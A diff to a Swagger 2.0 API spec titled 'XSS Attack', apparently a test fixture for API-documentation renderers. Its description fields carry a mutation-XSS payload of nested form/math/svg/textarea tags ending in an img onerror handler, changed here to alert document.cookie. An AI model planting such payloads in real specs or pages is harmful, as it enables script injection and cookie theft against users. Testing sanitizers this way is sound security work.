@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: XSS Attack
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.location) src=1>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
   version: 2.0.6
 produces:
   - application/xml
@@ -13,20 +13,20 @@ consumes:
 security:
   - basicAuth: []
 paths:
-  /M0X0101:
+  /test:
     get:
       responses:
         '200':
           description: No response was specified
       tags:
-        - M0X0101_XSS_D
+        - test
       operationId: findAccounts
       summary: Finds all accounts
-  '/hack/hachid/{id}':
+  '/test/{id}':
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.location) src=1>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
           format: int64
           in: path
           name: id
